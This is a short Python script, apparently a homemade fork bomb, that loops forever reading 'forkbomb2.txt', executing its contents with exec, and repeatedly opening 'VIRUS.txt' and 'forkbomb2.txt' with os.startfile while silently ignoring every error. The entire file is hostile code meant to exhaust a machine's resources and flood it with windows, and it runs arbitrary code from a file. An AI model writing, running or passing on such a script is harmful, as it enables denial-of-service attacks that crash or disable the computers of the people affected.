import os
while True:

	try:
		myfile = open("forkbomb2.txt",'r')
		a = myfile.read()
		exec(a)
		os.startfile("VIRUS.txt")
		os.startfile("forkbomb2.txt")
	except:
		continue

